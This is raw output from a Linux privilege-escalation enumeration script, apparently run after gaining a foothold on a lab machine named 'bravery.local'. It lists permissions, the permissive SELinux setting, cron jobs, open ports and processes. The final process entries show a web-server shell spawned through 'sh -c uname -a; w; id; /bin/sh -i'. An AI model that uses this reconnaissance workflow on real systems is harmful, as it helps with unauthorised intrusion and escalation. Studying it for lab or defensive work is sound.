[-] Are permissions on /home directories lax:
total 0
drwxr-xr-x.  4 root  root   31 Dec 25  2018 .
dr-xr-xr-x. 18 root  root  254 Sep 28  2018 ..
drwx------. 14 david david 279 Sep 29  2018 david
drwx------.  3 rick  rick   78 Jul 10  2018 rick


### ENVIRONMENTAL #######################################
[-] Environment information:
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
PWD=/var/nfsshare
LANG=C
NOTIFY_SOCKET=/run/systemd/notify
SHLVL=4
_=/usr/bin/env


[-] SELinux seems to be present:
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             targeted
Current mode:                   permissive
Mode from config file:          permissive
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Max kernel policy version:      31


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
dr-xr-xr-x. 2 root root 49152 Jul  4  2018 /usr/bin
drwxr-xr-x. 2 root root     6 Apr 11  2018 /usr/local/bin
drwxr-xr-x. 2 root root     6 Apr 11  2018 /usr/local/sbin
dr-xr-xr-x. 2 root root 20480 Jun 14  2018 /usr/sbin


[-] Available shells:
/bin/sh
/bin/bash
/sbin/nologin
/usr/bin/sh
/usr/bin/bash
/usr/sbin/nologin
/bin/tcsh
/bin/csh


[-] Current umask value:
0000
u=rwx,g=rwx,o=rwx


[-] umask value as specified in /etc/login.defs:
UMASK           077


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512 


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-------. 1 root root   0 Apr 10  2018 /etc/cron.deny
-rw-r--r--. 1 root root 451 Jun  9  2014 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x.   2 root root   54 Jun 13  2018 .
drwxr-xr-x. 142 root root 8192 Mar 23 11:45 ..
-rw-r--r--.   1 root root  128 Apr 10  2018 0hourly
-rw-r--r--.   1 root root  108 Apr 10  2018 raid-check
-rw-------.   1 root root  235 Apr 10  2018 sysstat

/etc/cron.daily:
total 24
drwxr-xr-x.   2 root root   57 Jun 10  2018 .
drwxr-xr-x. 142 root root 8192 Mar 23 11:45 ..
-rwx------.   1 root root  219 Apr 10  2018 logrotate
-rwxr-xr-x.   1 root root  618 Mar 17  2014 man-db.cron
-rwx------.   1 root root  208 Apr 10  2018 mlocate

/etc/cron.hourly:
total 16
drwxr-xr-x.   2 root root   22 Jun  9  2014 .
drwxr-xr-x. 142 root root 8192 Mar 23 11:45 ..
-rwxr-xr-x.   1 root root  392 Apr 10  2018 0anacron

/etc/cron.monthly:
total 12
drwxr-xr-x.   2 root root    6 Jun  9  2014 .
drwxr-xr-x. 142 root root 8192 Mar 23 11:45 ..

/etc/cron.weekly:
total 12
drwxr-xr-x.   2 root root    6 Jun  9  2014 .
drwxr-xr-x. 142 root root 8192 Mar 23 11:45 ..


[-] Crontab contents:
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed


[-] Anacron jobs and associated file permissions:
-rw-------. 1 root root 541 Apr 10  2018 /etc/anacrontab


[-] When were jobs last executed (/var/spool/anacron contents):
total 12
drwxr-xr-x.  2 root root  63 Jun 10  2018 .
drwxr-xr-x. 13 root root 153 Jun 14  2018 ..
-rw-------.  1 root root   9 Mar 25 03:18 cron.daily
-rw-------.  1 root root   9 Mar 23 16:06 cron.monthly
-rw-------.  1 root root   9 Mar 23 15:46 cron.weekly


[-] Systemd timers:
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Wed 2020-03-25 14:59:57 EDT  9h left  Tue 2020-03-24 14:59:57 EDT  14h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2020-03-26 00:00:00 EDT  18h left Wed 2020-03-25 00:00:01 EDT  5h 57min ago unbound-anchor.timer         unbound-anchor.service

2 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
enp0s17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.137  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 fe80::da60:e2d6:471d:10d6  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ad:1b:10  txqueuelen 1000  (Ethernet)
        RX packets 684041  bytes 94174582 (89.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 896346  bytes 1078946920 (1.0 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 136  bytes 11396 (11.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 136  bytes 11396 (11.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:3b:93:4f  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0-nic: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 52:54:00:3b:93:4f  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
? (10.0.0.116) at f8:16:54:51:da:b5 [ether] on enp0s17
? (10.0.0.67) at f8:16:54:51:da:b5 [ether] on enp0s17
gateway (10.0.0.1) at 70:3a:cb:dc:3b:37 [ether] on enp0s17
? (10.0.0.139) at f8:16:54:51:da:b5 [ether] on enp0s17
? (10.0.0.131) at 08:00:27:fe:6c:b5 [ether] on enp0s17


[-] Nameserver(s):
nameserver 10.0.0.1


[-] Default route:
default         gateway         0.0.0.0         UG    100    0        0 enp0s17


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:37595           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:45479           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:20048           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::41085                :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::2049                 :::*                    LISTEN      -                   
tcp6       0      0 :::54505                :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::111                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::20048                :::*                    LISTEN      -                   
tcp6       0      0 :::53                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:746           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:813             0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:53576           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:42921           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -                   
udp        0      0 192.168.122.1:53        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:53              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:67              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:33859           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:20048           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
udp        0      0 192.168.122.255:137     0.0.0.0:*                           -                   
udp        0      0 192.168.122.1:137       0.0.0.0:*                           -                   
udp        0      0 10.0.0.255:137          0.0.0.0:*                           -                   
udp        0      0 10.0.0.137:137          0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 192.168.122.255:138     0.0.0.0:*                           -                   
udp        0      0 192.168.122.1:138       0.0.0.0:*                           -                   
udp        0      0 10.0.0.255:138          0.0.0.0:*                           -                   
udp        0      0 10.0.0.137:138          0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -                   
udp6       0      0 :::813                  :::*                                -                   
udp6       0      0 ::1:323                 :::*                                -                   
udp6       0      0 :::57317                :::*                                -                   
udp6       0      0 :::2049                 :::*                                -                   
udp6       0      0 :::53                   :::*                                -                   
udp6       0      0 :::20048                :::*                                -                   
udp6       0      0 :::111                  :::*                                -                   
udp6       0      0 :::45687                :::*                                -                   


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 128184  4928 ?        Ss   Mar23   0:10 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root         2  0.0  0.0      0     0 ?        S    Mar23   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Mar23   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    Mar23   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    Mar23   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        R    Mar23   0:01 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   Mar23   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    Mar23   0:00 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S    Mar23   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   Mar23   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    Mar23   0:00 [khungtaskd]
root        16  0.0  0.0      0     0 ?        S<   Mar23   0:00 [writeback]
root        17  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kintegrityd]
root        18  0.0  0.0      0     0 ?        S<   Mar23   0:00 [bioset]
root        19  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kblockd]
root        20  0.0  0.0      0     0 ?        S<   Mar23   0:00 [md]
root        21  0.0  0.0      0     0 ?        S<   Mar23   0:00 [edac-poller]
root        27  0.0  0.0      0     0 ?        S    Mar23   0:00 [kswapd0]
root        28  0.0  0.0      0     0 ?        SN   Mar23   0:00 [ksmd]
root        29  0.0  0.0      0     0 ?        SN   Mar23   0:00 [khugepaged]
root        30  0.0  0.0      0     0 ?        S<   Mar23   0:00 [crypto]
root        38  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kthrotld]
root        40  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kmpath_rdacd]
root        41  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kaluad]
root        42  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kpsmoused]
root        43  0.0  0.0      0     0 ?        S<   Mar23   0:00 [ipv6_addrconf]
root        57  0.0  0.0      0     0 ?        S<   Mar23   0:00 [deferwq]
root        88  0.0  0.0      0     0 ?        S    Mar23   0:00 [kauditd]
root       262  0.0  0.0      0     0 ?        S<   Mar23   0:00 [ata_sff]
root       271  0.0  0.0      0     0 ?        S<   Mar23   0:00 [mpt_poll_0]
root       273  0.0  0.0      0     0 ?        S<   Mar23   0:00 [mpt/0]
root       274  0.0  0.0      0     0 ?        S    Mar23   0:00 [scsi_eh_0]
root       275  0.0  0.0      0     0 ?        S<   Mar23   0:00 [scsi_tmf_0]
root       276  0.0  0.0      0     0 ?        S    Mar23   0:00 [scsi_eh_1]
root       278  0.0  0.0      0     0 ?        S<   Mar23   0:00 [scsi_tmf_1]
root       279  0.0  0.0      0     0 ?        S    Mar23   0:00 [scsi_eh_2]
root       280  0.0  0.0      0     0 ?        S<   Mar23   0:00 [scsi_tmf_2]
root       347  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kdmflush]
root       348  0.0  0.0      0     0 ?        S<   Mar23   0:00 [bioset]
root       358  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kdmflush]
root       359  0.0  0.0      0     0 ?        S<   Mar23   0:00 [bioset]
root       371  0.0  0.0      0     0 ?        S<   Mar23   0:00 [bioset]
root       372  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfsalloc]
root       373  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs_mru_cache]
root       374  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-buf/dm-0]
root       375  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-data/dm-0]
root       376  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-conv/dm-0]
root       377  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-cil/dm-0]
root       378  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-reclaim/dm-]
root       379  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-log/dm-0]
root       380  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-eofblocks/d]
root       381  0.0  0.0      0     0 ?        S    Mar23   0:07 [xfsaild/dm-0]
root       382  0.0  0.0      0     0 ?        S<   Mar23   0:00 [kworker/0:1H]
root       452  0.0  0.4  37808  4344 ?        Ss   Mar23   0:02 /usr/lib/systemd/systemd-journald
root       472  0.0  0.0 127304   920 ?        Ss   Mar23   0:00 /usr/sbin/lvmetad -f
root       478  0.0  0.0      0     0 ?        S<   Mar23   0:00 [rpciod]
root       479  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xprtiod]
root       489  0.0  0.1  47620  1336 ?        Ss   Mar23   0:00 /usr/lib/systemd/systemd-udevd
root       546  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-buf/sda1]
root       548  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-data/sda1]
root       550  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-conv/sda1]
root       552  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-cil/sda1]
root       554  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-reclaim/sda]
root       556  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-log/sda1]
root       558  0.0  0.0      0     0 ?        S<   Mar23   0:00 [xfs-eofblocks/s]
root       570  0.0  0.0      0     0 ?        S    Mar23   0:00 [xfsaild/sda1]
root       612  0.0  0.0  55508   676 ?        S<sl Mar23   0:00 /sbin/auditd
root       614  0.0  0.0  84552   772 ?        S<sl Mar23   0:00 /sbin/audispd
root       616  0.0  0.0  19360    56 ?        Ss   Mar23   0:00 /usr/sbin/rpc.idmapd
root       617  0.0  0.1  55600  1300 ?        S<   Mar23   0:00 /usr/sbin/sedispatch
rtkit      640  0.0  0.1 198760  1360 ?        SNsl Mar23   0:00 /usr/libexec/rtkit-daemon
root       641  0.0  0.2 446576  2812 ?        Ssl  Mar23   0:00 /usr/libexec/udisks2/udisksd
root       642  0.0  0.1 223752  1448 ?        Ss   Mar23   0:00 /usr/sbin/abrtd -d -s
root       643  0.0  0.0  24492   952 ?        Ss   Mar23   0:00 /usr/sbin/smartd -n -q never
dbus       644  0.0  0.3  69780  3208 ?        Ssl  Mar23   0:11 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
rpc        645  0.0  0.0  69320   928 ?        Ss   Mar23   0:00 /sbin/rpcbind -w
root       655  0.0  0.2 396292  2452 ?        Ssl  Mar23   0:00 /usr/libexec/accounts-daemon
root       657  0.0  0.1 221232  1260 ?        Ss   Mar23   0:00 /usr/bin/abrt-watch-log -F Backtrace /var/log/Xorg.0.log -- /usr/bin/abrt-dump-xorg -xD
root       661  0.0  0.1  26376  1564 ?        Ss   Mar23   0:02 /usr/lib/systemd/systemd-logind
avahi      662  0.0  0.1  62244  1800 ?        Ss   Mar23   0:02 avahi-daemon: running [bravery.local]
polkitd    664  0.0  1.3 545884 13768 ?        Ssl  Mar23   0:27 /usr/lib/polkit-1/polkitd --no-debug
libstor+   669  0.0  0.0   8576   668 ?        Ss   Mar23   0:00 /usr/bin/lsmd -d
root       670  0.0  0.4 430540  4604 ?        Ssl  Mar23   0:00 /usr/sbin/ModemManager
root       677  0.0  0.2 221232  2676 ?        Ss   Mar23   0:00 /usr/bin/abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected ernel BUG at list_del corruption list_add corruption do_IRQ: stack overflow: ear stack overflow (cur: eneral protection fault nable to handle kernel ouble fault: RTNL: assertion failed eek! page_mapcount(page) went negative! adness at NETDEV WATCHDOG ysctl table check failed : nobody cared IRQ handler type mismatch Kernel panic - not syncing: Machine Check Exception: Machine check events logged divide error: bounds: coprocessor segment overrun: invalid TSS: segment not present: invalid opcode: alignment check: stack segment: fpu exception: simd exception: iret exception: /var/log/messages -- /usr/bin/abrt-dump-oops -xtD
root       679  0.0  0.0  13216   604 ?        Rs   Mar23   0:01 /sbin/rngd -f
avahi      680  0.0  0.0  62112   200 ?        S    Mar23   0:00 avahi-daemon: chroot helper
root       687  0.0  0.0  16884   836 ?        SNs  Mar23   0:00 /usr/sbin/alsactl -s -n 19 -c -E ALSA_CONFIG_PATH=/etc/alsa/alsactl.conf --initfile=/lib/alsa/init/00main rdaemon
root       700  0.0  0.1 201400  1060 ?        Ssl  Mar23   0:00 /usr/sbin/gssproxy -D
chrony     702  0.0  0.1 117752  1644 ?        S    Mar23   0:00 /usr/sbin/chronyd
root       728  0.0  0.5 565904  5940 ?        Ssl  Mar23   0:00 /usr/sbin/NetworkManager --no-daemon
root       731  0.0  0.1 115432  1032 ?        S    Mar23   0:01 /bin/bash /usr/sbin/ksmtuned
root       987  0.0  0.4 223008  4584 ?        Ssl  Mar23   0:04 /usr/sbin/rsyslogd -n
root       989  0.0  0.2 112812  2324 ?        Ss   Mar23   0:00 /usr/sbin/sshd -D
nobody     990  0.0  0.1  53852  1648 ?        Ss   Mar23   0:00 /usr/sbin/dnsmasq -k
root       992  0.0  1.5 576632 16056 ?        Ssl  Mar23   0:06 /usr/bin/python -Es /usr/sbin/tuned -l -P
rpcuser    994  0.0  0.1  44580  1668 ?        Ss   Mar23   0:00 /usr/sbin/rpc.statd
root       997  0.0  0.3 348928  3408 ?        Ss   Mar23   0:01 /usr/sbin/nmbd --foreground --no-process-group
root      1004  0.0  0.2 197916  2972 ?        Ss   Mar23   0:00 /usr/sbin/cupsd -f
root      1026  0.0  0.8 411000  8332 ?        Ss   Mar23   0:03 /usr/sbin/httpd -DFOREGROUND
root      1034  0.0  0.9 695112 10032 ?        Ssl  Mar23   0:00 /usr/sbin/libvirtd
root      1045  0.0  0.1 126280  1648 ?        Ss   Mar23   0:01 /usr/sbin/crond -n
root      1046  0.0  0.0  25904   868 ?        Ss   Mar23   0:00 /usr/sbin/atd -f
root      1047  0.0  0.3 481240  3084 ?        Ssl  Mar23   0:00 /usr/sbin/gdm
root      1059  0.0  0.4 422688  4304 ?        Ss   Mar23   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1060  0.0  0.2  43824  2672 ?        Ss   Mar23   0:00 /usr/sbin/rpc.mountd
root      1088  0.0  0.9 304540  9760 tty1     Ssl+ Mar23   0:00 /usr/bin/X :0 -background none -noreset -audit 4 -verbose -auth /run/gdm/auth-for-gdm-bE8h55/database -seat seat0 -nolisten tcp vt1
root      1121  0.0  0.0      0     0 ?        S<   Mar23   0:00 [nfsd4_callbacks]
root      1123  0.0  0.0      0     0 ?        S    Mar23   0:00 [lockd]
mysql     1133  0.0  0.1 113304  1580 ?        Ss   Mar23   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
root      1139  0.0  0.2 120792  2232 ?        Ss   Mar23   0:00 nginx: master process /usr/sbin/nginx
nginx     1141  0.0  0.3 123264  3512 ?        S    Mar23   0:31 nginx: worker process
root      1144  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1146  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1150  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1160  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1161  0.0  0.0   6548   480 ?        S    Mar23   0:00 /var/ossec/bin/ossec-execd
root      1164  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1167  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1169  0.0  0.2 415176  2552 ?        S    Mar23   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1170  0.0  0.2 415660  2916 ?        S    Mar23   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1174  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
root      1178  0.0  0.0      0     0 ?        S    Mar23   0:00 [nfsd]
ossec     1184  0.0  0.3  12372  3312 ?        S    Mar23   0:16 /var/ossec/bin/ossec-analysisd
root      1194  0.0  0.0   4592   580 ?        S    Mar23   0:04 /var/ossec/bin/ossec-logcollector
root      1211  0.0  0.3 423196  3364 ?        S    Mar23   0:00 /usr/sbin/smbd --foreground --no-process-group
mysql     1401  0.0  7.8 924608 79668 ?        Sl   Mar23   0:20 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
root      1442  0.0  0.2   6468  2748 ?        S    Mar23   0:30 /var/ossec/bin/ossec-syscheckd
ossec     1450  0.0  0.0   6804   752 ?        S    Mar23   0:00 /var/ossec/bin/ossec-monitord
root      1651  0.0  0.3 362948  3192 ?        Sl   Mar23   0:00 gdm-session-worker [pam/gdm-launch-environment]
root      1659  0.0  0.1  91716  1900 ?        Ss   Mar23   0:00 /usr/libexec/postfix/master -w
postfix   1670  0.0  0.2  91888  2044 ?        S    Mar23   0:00 qmgr -l -t unix -u
gdm       1682  0.0  0.4 696920  4648 ?        Ssl  Mar23   0:00 /usr/libexec/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
nobody    1688  0.0  0.0  53852   940 ?        S    Mar23   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
root      1691  0.0  0.0  53824   372 ?        S    Mar23   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
gdm       1742  0.0  0.0  58860   828 ?        S    Mar23   0:00 dbus-launch --exit-with-session /usr/libexec/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       1750  0.0  0.1  68668  1908 ?        Ssl  Mar23   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
gdm       1754  0.0  0.2 346740  2308 ?        Sl   Mar23   0:00 /usr/libexec/at-spi-bus-launcher
gdm       1759  0.0  0.2  68368  2164 ?        Sl   Mar23   0:00 /bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
gdm       1763  0.0  0.2 233036  2676 ?        Sl   Mar23   0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
gdm       1783  0.0  9.8 2938496 100168 ?      Sl   Mar23   0:15 /usr/bin/gnome-shell
root      1789  0.0  0.2 430172  3040 ?        Ssl  Mar23   0:00 /usr/libexec/upowerd
gdm       1798  0.0  0.4 1252016 4120 ?        S<l  Mar23   0:00 /usr/bin/pulseaudio --start --log-target=syslog
gdm       1822  0.0  0.2 424612  2720 ?        Sl   Mar23   0:00 /usr/libexec/xdg-permission-store
gdm       1827  0.0  0.5 526536  5780 ?        Sl   Mar23   0:01 ibus-daemon --xim --panel disable
gdm       1831  0.0  0.2 375828  2136 ?        Sl   Mar23   0:00 /usr/libexec/ibus-dconf
gdm       1835  0.0  0.7 484420  7428 ?        Sl   Mar23   0:00 /usr/libexec/ibus-x11 --kill-daemon
gdm       1840  0.0  0.2 375808  2076 ?        Sl   Mar23   0:00 /usr/libexec/ibus-portal
root      1856  0.0  0.3 410356  3316 ?        Ssl  Mar23   0:01 /usr/libexec/packagekitd
root      1858  0.0  0.1  78616  1928 ?        Ss   Mar23   0:00 /usr/sbin/wpa_supplicant -u -f /var/log/wpa_supplicant.log -c /etc/wpa_supplicant/wpa_supplicant.conf -P /var/run/wpa_supplicant.pid
gdm       1862  0.0  0.7 574720  7524 ?        Sl   Mar23   0:00 /usr/libexec/gsd-wacom
gdm       1864  0.0  0.9 634636  9804 ?        Sl   Mar23   0:00 /usr/libexec/gsd-xsettings
gdm       1866  0.0  0.7 570744  7416 ?        Sl   Mar23   0:00 /usr/libexec/gsd-a11y-keyboard
gdm       1870  0.0  0.5 535396  5536 ?        Sl   Mar23   0:00 /usr/libexec/gsd-a11y-settings
gdm       1873  0.0  0.7 484036  7240 ?        Sl   Mar23   0:00 /usr/libexec/gsd-clipboard
gdm       1877  0.0  0.9 731332  9716 ?        Sl   Mar23   0:13 /usr/libexec/gsd-color
gdm       1879  0.0  0.5 495496  5820 ?        Sl   Mar23   0:00 /usr/libexec/gsd-datetime
gdm       1884  0.0  0.3 535244  3176 ?        Sl   Mar23   0:00 /usr/libexec/gsd-housekeeping
gdm       1892  0.0  0.7 642384  7428 ?        Sl   Mar23   0:00 /usr/libexec/gsd-keyboard
gdm       1894  0.0  1.0 1033896 10328 ?       Sl   Mar23   0:00 /usr/libexec/gsd-media-keys
gdm       1895  0.0  0.3 459400  3356 ?        Sl   Mar23   0:00 /usr/libexec/gsd-mouse
gdm       1900  0.0  0.7 724812  7732 ?        Sl   Mar23   0:00 /usr/libexec/gsd-power
gdm       1904  0.0  0.3 484740  3692 ?        Sl   Mar23   0:00 /usr/libexec/gsd-print-notifications
gdm       1908  0.0  0.3 459420  3320 ?        Sl   Mar23   0:00 /usr/libexec/gsd-rfkill
gdm       1914  0.0  0.3 533140  3204 ?        Sl   Mar23   0:00 /usr/libexec/gsd-screensaver-proxy
gdm       1918  0.0  0.2 415416  2576 ?        Sl   Mar23   0:00 /usr/libexec/gsd-sharing
gdm       1922  0.0  0.5 637776  5912 ?        Sl   Mar23   0:00 /usr/libexec/gsd-smartcard
gdm       1925  0.0  0.3 577728  3748 ?        Sl   Mar23   0:00 /usr/libexec/gsd-sound
colord    1952  0.0  0.5 419392  5820 ?        Ssl  Mar23   0:00 /usr/libexec/colord
gdm       1965  0.0  0.2 302012  2036 ?        Sl   Mar23   0:00 /usr/libexec/ibus-engine-simple
apache    3271  0.0  0.8 413216  8588 ?        S    04:34   0:00 /usr/sbin/httpd -DFOREGROUND
postfix   3720  0.0  0.4  91820  4072 ?        S    05:07   0:00 pickup -l -t unix -u
root      4075  0.0  0.0      0     0 ?        S    05:35   0:00 [kworker/u2:0]
apache    4153  0.0  0.9 413652  9268 ?        S    Mar23   0:00 /usr/sbin/httpd -DFOREGROUND
apache    4154  0.0  0.8 413652  8268 ?        S    Mar23   0:00 /usr/sbin/httpd -DFOREGROUND
apache    4155  0.0  0.8 413636  8392 ?        S    Mar23   0:00 /usr/sbin/httpd -DFOREGROUND
apache    4156  0.0  0.8 413636  8712 ?        S    Mar23   0:00 /usr/sbin/httpd -DFOREGROUND
apache    4157  0.0  0.8 413636  8328 ?        S    Mar23   0:00 /usr/sbin/httpd -DFOREGROUND
root      4183  0.0  0.0      0     0 ?        S    05:44   0:00 [kworker/0:0]
root      4203  0.0  0.0      0     0 ?        S    05:45   0:00 [kworker/u2:2]
apache    4232  0.0  0.1  11680  1360 ?        S    05:47   0:00 sh -c uname -a; w; id; /bin/sh -i
apache    4237  0.0  0.1  11688  1720 ?        S    05:47   0:00 /bin/sh -i
apache    4285  0.0  0.1  11680  1380 ?        S    05:48   0:00 /bin/bash
root      4317  0.0  0.0      0     0 ?        S    05:50   0:00 [kworker/0:2]
